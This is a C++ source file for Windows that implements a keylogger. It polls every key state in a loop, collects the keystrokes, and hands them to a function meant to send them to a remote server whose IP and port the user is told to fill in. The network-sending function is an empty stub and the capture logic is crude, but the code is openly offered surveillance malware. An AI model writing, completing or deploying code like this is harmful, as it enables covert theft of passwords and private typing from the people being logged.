#include <iostream>
#include <Windows.h>
#include <fstream>
#include <thread>
#include <string>
#include <stdexcept>

std::ofstream openLogFile(const std::string& filename) {
    std::ofstream logfile(filename, std::ios_base::app);
    if (!logfile) {
        throw std::runtime_error("Failed to open log file.");
    }
    return logfile;
}

bool isLetterKey(char key) {
    return (key >= 'A' && key <= 'Z');
}

void writeToFile(std::ofstream& logfile, char key) {
    logfile << key;
}

void sendToServer(const std::string& serverIP, int port, const std::string& data) {
    // Implement sending data to the server (encryption can be added here)
    // You can use sockets or any other communication method
}

void keyboardListener(const std::string& serverIP, int port) {
    std::string data;

    while (true) {
        for (int i = 8; i <= 255; i++) {
            if (GetAsyncKeyState(i) & 0x8000) {
                char key = static_cast<char>(i);

                if (isLetterKey(key)) {
                    key += 32;
                }

                data += key;
            }
        }

        if (!data.empty()) {
            try {
                sendToServer(serverIP, port, data);
                data.clear();
            } catch (const std::exception& e) {
                // Handle the exception (e.g., log it or display an error message)
                std::cerr << "Error: " << e.what() << std::endl;
            }
        }

        // Sleep for a short duration to avoid excessive CPU usage
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
}

int main() {
    const std::string serverIP = "127.0.0.1"; // Replace with your server IP
    const int port = 12345; // Replace with your desired port

    try {
        keyboardListener(serverIP, port);
    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
    }

    return 0;
}